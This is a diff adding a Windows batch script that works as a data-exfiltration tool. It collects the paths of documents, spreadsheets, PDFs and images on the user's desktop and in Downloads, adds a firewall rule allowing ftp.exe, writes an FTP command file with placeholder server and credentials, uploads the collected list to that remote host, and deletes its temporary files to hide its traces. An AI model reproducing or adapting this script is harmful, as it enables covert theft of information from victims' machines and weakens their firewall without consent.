@@ -1,0 +1,82 @@
+@echo off
+
+::Collector
+dir /s /a /b "%userprofile%\desktop\*.txt">%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\desktop\*.doc">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\desktop\*.docx">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\desktop\*.xls">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\desktop\*.xlsx">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\desktop\*.ppt">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\desktop\*.xls">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\desktop\*.eet">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\desktop\*.et">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\desktop\*.xlt">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\desktop\*.pdf">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\desktop\*.jpg">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\desktop\*.jpeg">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\desktop\*.png">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\desktop\*.bmp">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\desktop\*.gif">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\desktop\*.rtf">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\desktop\*.htl">>%temp%\lucky.bat 2>null
+
+dir /s /a /b "%userprofile%\Downloads\*.txt">%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\Downloads\*.doc">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\Downloads\*.docx">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\Downloads\*.xls">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\Downloads\*.xlsx">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\Downloads\*.ppt">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\Downloads\*.xls">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\Downloads\*.eet">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\Downloads\*.et">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\Downloads\*.xlt">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\Downloads\*.pdf">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\Downloads\*.jpg">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\Downloads\*.jpeg">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\Downloads\*.png">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\Downloads\*.bmp">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\Downloads\*.gif">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\Downloads\*.rtf">>%temp%\lucky.bat 2>null
+dir /s /a /b "%userprofile%\Downloads\*.htl">>%temp%\lucky.bat 2>null
+
+::Firewall
+netsh advfirewall firewall add rule name="ftp.exe" dir=in program="C:\Windows\System32\ftp.exe" action=allow
+
+::Location
+set cdr=%CD%
+echo %cdr%
+cd %temp%
+
+::Prepare
+set upload=upload.txt
+set time=%DATE:~0,4%%DATE:~5,2%%DATE:~8,2%
+ren lucky.bat lucky%time%.bat
+
+::Prepare-server
+set server=IP
+set username=ftp-user
+set password=ftp-pwd
+
+::Prepare-Files
+set source=%temp%\lucky*.bat 
+set purpose=X
+
+::Input
+echo open %server%>>%upload%
+echo user %username%>>%upload%
+echo %password%>>%upload%
+echo prompt>>%upload%
+echo cd %purpose%>>%upload%
+echo binary>>%upload%
+echo mput %source%>>%upload%
+echo bye>>%upload%
+
+::Exec
+ftp -s:%upload% -n 2>null
+
+::Cleanup
+del %upload% /Q
+del lucky*
+del null /Q
+cd %cdr%
+del null /Q
